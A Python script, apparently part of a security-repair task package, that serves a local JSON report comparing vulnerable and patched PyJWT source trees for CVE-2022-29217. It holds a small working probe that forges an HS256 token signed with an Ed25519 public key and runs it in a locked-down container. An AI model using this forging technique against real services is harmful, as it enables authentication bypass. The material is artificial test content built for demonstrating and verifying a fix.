"""Serve a loopback-only JSON demonstration of the PyJWT key-confusion behavior."""

import argparse
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import subprocess

ROOT = Path(__file__).resolve().parent
PROBE = r'''import base64, hashlib, hmac, json
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
private = ed25519.Ed25519PrivateKey.generate()
public = private.public_key().public_bytes(serialization.Encoding.OpenSSH, serialization.PublicFormat.OpenSSH)
def segment(value): return base64.urlsafe_b64encode(value).rstrip(b"=")
header = segment(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(",", ":")).encode())
payload = segment(json.dumps({"sub":"loopback-demo"}, separators=(",", ":")).encode())
message = header + b"." + payload
token = message.decode() + "." + segment(hmac.new(public, message, hashlib.sha256).digest()).decode()
try:
    claims = jwt.decode(token, public, algorithms=jwt.algorithms.get_default_algorithms())
except jwt.InvalidKeyError as error:
    print(json.dumps({"result":"rejected","exception":type(error).__name__}))
else:
    print(json.dumps({"result":"accepted","claims":claims}))
'''


def probe_source(source, image):
    source = Path(source).resolve()
    try:
        source.relative_to(ROOT)
    except ValueError as error:
        raise ValueError("Demo source must remain inside security-repair") from error
    try:
        completed = subprocess.run(
            [
                "docker", "run", "--rm", "--network", "none", "--read-only",
                "--cap-drop", "ALL", "--security-opt", "no-new-privileges",
                "--tmpfs", "/tmp:rw,nosuid,size=32m",
                "--mount", f"type=bind,src={source},dst=/task,readonly",
                "--workdir", "/task", "--env", "PYTHONPATH=/task",
                image, "python", "-c", PROBE,
            ],
            capture_output=True,
            text=True,
            timeout=20,
            check=False,
        )
    except (OSError, subprocess.SubprocessError) as error:
        return {"result": "error", "error_type": type(error).__name__}
    if completed.returncode:
        return {"result": "error", "error_type": "ProbeFailed", "detail": completed.stderr[-500:]}
    try:
        return json.loads(completed.stdout.strip().splitlines()[-1])
    except (json.JSONDecodeError, IndexError):
        return {"result": "error", "error_type": "InvalidProbeOutput"}


class Handler(BaseHTTPRequestHandler):
    vulnerable_source = ROOT / "starter"
    patched_source = ROOT / "reference"
    image = "pyjwt-security:0.1"

    def do_GET(self):
        if self.path not in ("/", "/probe.json"):
            self.send_error(404)
            return
        report = {
            "cve": "CVE-2022-29217",
            "demonstration": "An HS256 token is signed using an Ed25519 OpenSSH public key, then verified against that same public key.",
            "vulnerable_snapshot": probe_source(self.vulnerable_source, self.image),
            "patched_snapshot": probe_source(self.patched_source, self.image),
        }
        payload = json.dumps(report, indent=2).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, format_string, *args):
        print(format_string % args)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--patched", type=Path, default=ROOT / "reference", help="candidate source tree within security-repair")
    parser.add_argument("--image", default="pyjwt-security:0.1", help="prebuilt offline verifier image")
    parser.add_argument("--port", type=int, default=8765)
    args = parser.parse_args()
    Handler.patched_source = args.patched
    Handler.image = args.image
    server = ThreadingHTTPServer(("127.0.0.1", args.port), Handler)
    print(f"Open http://127.0.0.1:{args.port}/ for the local demonstration. Press Ctrl+C to stop.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
